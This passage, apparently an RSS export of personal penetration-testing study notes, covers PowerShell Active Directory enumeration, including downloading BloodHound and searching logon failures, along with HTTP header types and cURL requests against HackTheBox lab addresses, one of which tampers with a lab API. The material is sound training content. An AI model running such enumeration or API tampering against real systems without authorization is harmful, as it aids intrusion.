    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(New-Object Net.WebClient).DownloadFile(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Bloodhound.zip&amp;#34;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Getting filtered AD users&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-ADUser -Filter &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Name -like &amp;#34;*SvcAccount&amp;#34;&amp;#39;&lt;/span&gt; | Format-Table Name,SamAccountName -A&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Get all users in a domain&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-ADUser -Filter * -SearchBase &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Filter failed logon attempts using &lt;code&gt;Get-EventLog&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-EventLog Security | where {$_.EventID &lt;span style=&#34;color:#f92672&#34;&gt;-eq&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4625&amp;#34;&lt;/span&gt;} | select -ExpandProperty Message | findstr &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Ac
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;count Name&amp;#34;&lt;/span&gt; | sort&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/archive/notes/1-web-applications/1a-web-requests/1a1-http-requests/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/notes/1-web-applications/1a-web-requests/1a1-http-requests/</guid>
      <description>&lt;h1 id=&#34;1a1---http-requests&#34;&gt;
  1a1 - HTTP requests
  &lt;a href=&#34;#1a1---http-requests&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;HTTP headers are used to transfer information from the client or server. &lt;/p&gt;
&lt;p&gt;The client function can be implemented by the &lt;a href=&#34;1a2-curl.md&#34;&gt;cURL &lt;/a&gt;program, which is a good tool for pentesting. &lt;/p&gt;
&lt;p&gt;We have the following categories of headers&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;General Headers&lt;/li&gt;
&lt;li&gt;Entity Headers&lt;/li&gt;
&lt;li&gt;Request Headers&lt;/li&gt;
&lt;li&gt;Response Headers&lt;/li&gt;
&lt;li&gt;Security Headers&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;General Headers&lt;/code&gt;&lt;/strong&gt; are used to describe the message, not its content. They are found in HTTP requests and responses.&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;1a1---http-requests&#34;&gt;
  1a1 - HTTP requests
  &lt;a href=&#34;#1a1---http-requests&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;HTTP headers are used to transfer information from the client or server. &lt;/p&gt;
&lt;p&gt;The client function can be implemented by the &lt;a href=&#34;1a2-curl.md&#34;&gt;cURL &lt;/a&gt;program, which is a good tool for pentesting. &lt;/p&gt;
&lt;p&gt;We have the following categories of headers&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;General Headers&lt;/li&gt;
&lt;li&gt;Entity Headers&lt;/li&gt;
&lt;li&gt;Request Headers&lt;/li&gt;
&lt;li&gt;Response Headers&lt;/li&gt;
&lt;li&gt;Security Headers&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;General Headers&lt;/code&gt;&lt;/strong&gt; are used to describe the message, not its content. They are found in HTTP requests and responses.&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Header&lt;/th&gt;
          &lt;th&gt;Example&lt;/th&gt;
          &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Date&lt;/td&gt;
          &lt;td&gt;Date: Wed, 16 Feb 2022 10:38:44 GMT&lt;/td&gt;
          &lt;td&gt;Message creation date&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Connection&lt;/td&gt;
          &lt;td&gt;Connection: Keep-Alive&lt;/td&gt;
          &lt;td&gt;Determines whether the connection should remain open or be closed with the following tags: &lt;code&gt;close&lt;/code&gt; or &lt;code&gt;Keep-Alive&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Entity Headers&lt;/code&gt;&lt;/strong&gt; are used to describe the content of a message and are found in POST and PUT headers.&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Header&lt;/th&gt;
          &lt;th&gt;Example&lt;/th&gt;
          &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Content-Type&lt;/td&gt;
          &lt;td&gt;Content-Type: text/html&lt;/td&gt;
          &lt;td&gt;Describes the type of resource being transferred.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Media-Type&lt;/td&gt;
          &lt;td&gt;Media-Type: application/pdf&lt;/td&gt;
          &lt;td&gt;Similar to the content type, but directly conveys the type of information.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Boundary&lt;/td&gt;
          &lt;td&gt;boundary=&amp;ldquo;b4e4fbd93540&amp;rdquo;&lt;/td&gt;
          &lt;td&gt;Used to separate multiple pieces of data in a single message.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Content-Length&lt;/td&gt;
          &lt;td&gt;Content-Length: 385&lt;/td&gt;
          &lt;td&gt;Contains the size of the information to be transmitted.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Content-Encoding&lt;/td&gt;
          &lt;td&gt;Content-Encoding: gzip&lt;/td&gt;
          &lt;td&gt;It transmits a way of encoding information.&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc7231#autoid-42&#34;&gt;&lt;code&gt;Request Headers&lt;/code&gt;&lt;/a&gt; are used for HTTP requests and has no connection to the content of the information. It has the following headers&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Header&lt;/th&gt;
          &lt;th&gt;Example&lt;/th&gt;
          &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Host&lt;/td&gt;
          &lt;td&gt;Host: &lt;a href=&#34;https://www.inlanefreight.com&#34;&gt;www.inlanefreight.com&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Describes the address of the server to which the request is sent.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;User-Agent&lt;/td&gt;
          &lt;td&gt;User-Agent: curl/7.77.0&lt;/td&gt;
          &lt;td&gt;It is used to describe the client agent. This header can be used to determine what program the client is using to connect to the server.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Referer&lt;/td&gt;
          &lt;td&gt;Referer: &lt;a href=&#34;http://www.inlanefreight.com/&#34;&gt;http://www.inlanefreight.com/&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Describes where the current demand is coming from.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Accept&lt;/td&gt;
          &lt;td&gt;Accept: */*&lt;/td&gt;
          &lt;td&gt;Describes what types of information the client can accept. &lt;code&gt;*&lt;/code&gt;&lt;em&gt;&lt;code&gt;/&lt;/code&gt;&lt;/em&gt;&lt;code&gt;*&lt;/code&gt; means all types of data are allowed.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Cookie&lt;/td&gt;
          &lt;td&gt;Cookie: PHPSESSID=b4e4fbd93540&lt;/td&gt;
          &lt;td&gt;A cookie record consists of a name=value pair. It is data that is stored on the client and server and serves as an identifier. It is sent to the server on each request to identify the client. It can also be used for session tracking. Multiple cookies can be contained in one header and are separated by a &lt;code&gt;;&lt;/code&gt; .&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Authorization&lt;/td&gt;
          &lt;td&gt;Authorization: BASIC cGFzc3dvcmQK&lt;/td&gt;
          &lt;td&gt;One way to identify a client. After authentication, the server assigns the client a unique token, which is stored on the client side and will be retrieved by the server on each request.&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;code&gt;Response Headers&lt;/code&gt; are used in the HTTP response header and is also unrelated to context. Age, location, and server data are used in the response header to create context.&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Header&lt;/th&gt;
          &lt;th&gt;Example&lt;/th&gt;
          &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Server&lt;/td&gt;
          &lt;td&gt;Server: Apache/2.2.14 (Win32)&lt;/td&gt;
          &lt;td&gt;Contains information about the server&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Set-Cookie&lt;/td&gt;
          &lt;td&gt;Set-Cookie: PHPSESSID=b4e4fbd93540&lt;/td&gt;
          &lt;td&gt;Contains a cookie record about the user.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;WWW-Authenticate&lt;/td&gt;
          &lt;td&gt;WWW-Authenticate: BASIC realm=&amp;ldquo;localhost&amp;rdquo;&lt;/td&gt;
          &lt;td&gt;Informs the client about the possible authentication type&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;code&gt;Security Headers&lt;/code&gt; are used to set rules and policies for the browser.&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Header&lt;/th&gt;
          &lt;th&gt;Example&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Content-Security-Policy&lt;/td&gt;
          &lt;td&gt;Content-Security-Policy: script-src &amp;lsquo;self&amp;rsquo;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Strict-Transport-Security&lt;/td&gt;
          &lt;td&gt;Strict-Transport-Security: max-age=31536000&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Referrer-Policy&lt;/td&gt;
          &lt;td&gt;Referrer-Policy: origin&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</content>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/archive/notes/1-web-applications/1a-web-requests/1a2-curl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/notes/1-web-applications/1a-web-requests/1a2-curl/</guid>
      <description>&lt;h1 id=&#34;1a2---curl&#34;&gt;
  1a2 - cURL
  &lt;a href=&#34;#1a2---curl&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;cURL (Client URL) is a CLI program used to establish communication with various protocols and retrieve information. It is a good tool for pentesting because it provides raw data from a web application.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Usage: curl &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;options...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &amp;lt;url&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -d, --data &amp;lt;data&amp;gt;           HTTP POST data
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -f, --fail                  Fail fast with no output on HTTP errors
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -h, --help &amp;lt;category&amp;gt;       Get help &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; commands
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -i, --include               Include response headers in output
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -o, --output &amp;lt;file&amp;gt;         Write to file instead of stdout
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -O, --remote-name           Write output to file named as remote file
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -s, --silent                Silent mode
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -T, --upload-file &amp;lt;file&amp;gt;    Transfer local FILE to destination
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -u, --user &amp;lt;user:password&amp;gt;  Server user and password
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -A, --user-agent &amp;lt;name&amp;gt;     Send User-Agent &amp;lt;name&amp;gt; to server
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -v, --verbose               Make the operation more talkative
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -V, --version               Show version number and quit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-d is used to insert information into the URL
-H is used to specify HTTP Headers
-X is used to specify the request type (GET, POST, PUT, DELETE...)
- POST create/upload
- PUT replace
- DELETE delete
- GET read
-v print verbose
-i print response header
-I show header only
-u authentication arguments `curl -u admin:admin http://example.com/auth.php`&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Replacing information in the database using the CRUD API on the website&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;1a2---curl&#34;&gt;
  1a2 - cURL
  &lt;a href=&#34;#1a2---curl&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;cURL (Client URL) is a CLI program used to establish communication with various protocols and retrieve information. It is a good tool for pentesting because it provides raw data from a web application.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Usage: curl &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;options...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &amp;lt;url&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -d, --data &amp;lt;data&amp;gt;           HTTP POST data
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -f, --fail                  Fail fast with no output on HTTP errors
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -h, --help &amp;lt;category&amp;gt;       Get help &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; commands
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -i, --include               Include response headers in output
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -o, --output &amp;lt;file&amp;gt;         Write to file instead of stdout
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -O, --remote-name           Write output to file named as remote file
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -s, --silent                Silent mode
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -T, --upload-file &amp;lt;file&amp;gt;    Transfer local FILE to destination
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -u, --user &amp;lt;user:password&amp;gt;  Server user and password
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -A, --user-agent &amp;lt;name&amp;gt;     Send User-Agent &amp;lt;name&amp;gt; to server
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -v, --verbose               Make the operation more talkative
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -V, --version               Show version number and quit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-d is used to insert information into the URL
-H is used to specify HTTP Headers
-X is used to specify the request type (GET, POST, PUT, DELETE...)
- POST create/upload
- PUT replace
- DELETE delete
- GET read
-v print verbose
-i print response header
-I show header only
-u authentication arguments `curl -u admin:admin http://example.com/auth.php`&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Replacing information in the database using the CRUD API on the website&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -X PUT 94.237.53.157:42065/api.php/city/Tbilisi -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#34;city_name&amp;#34;:&amp;#34;flag&amp;#34;, &amp;#34;country_name&amp;#34;:&amp;#34;(HTB)&amp;#34;}&amp;#39;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type: application/json&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&#34;curl-get-parameters&#34;&gt;
  cURL GET parameters
  &lt;a href=&#34;#curl-get-parameters&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;HTTP GET variables can be set by adding them to the URL.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl http://10.10.10.10/index.php?sessionid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;vn0g4d94rs09rgpqga85r9bnia&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&#34;curl-post-parameters&#34;&gt;
  cURL POST parameters
  &lt;a href=&#34;#curl-post-parameters&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;HTTP POST variables can be set using the -d (&amp;ndash;data) parameter.&lt;br&gt;
Here is a simple login test example:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email=test@test.com&amp;amp;password=test&amp;#34;&lt;/span&gt; http://10.10.10.10/login.php&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&#34;curl-cookies&#34;&gt;
  cURL COOKIES
  &lt;a href=&#34;#curl-cookies&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;cURL has an entire cookie engine that can be used to store and load cookies passed to it from a server between sessions:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl -b oldcookies.txt -c newcookies.txt http://10.10.10.10/login.php&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;You can also specify your own cookies using the -b parameter:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;shell&lt;/span&gt;
    &lt;/span&gt;


